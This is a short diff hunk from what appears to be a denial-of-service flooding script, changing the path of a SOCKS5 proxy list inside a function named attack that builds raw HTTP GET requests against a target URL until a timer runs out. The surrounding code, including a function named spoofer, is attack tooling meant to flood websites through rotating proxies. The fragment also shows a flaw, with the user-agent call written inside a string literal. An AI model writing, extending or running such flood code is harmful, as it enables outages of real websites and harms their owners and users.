@@ -35,7 +35,7 @@ def spoofer():
 
 def attack(url, timer):
     timeout = time.time() + int(timer)
-    proxies = open("socks5.txt").readlines()
+    proxies = open("utils/socks5.txt").readlines()
     proxy = random.choice(proxies).strip().split(":")
     req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "User-Agent: random.choice(UAlist())" + "\r\n"
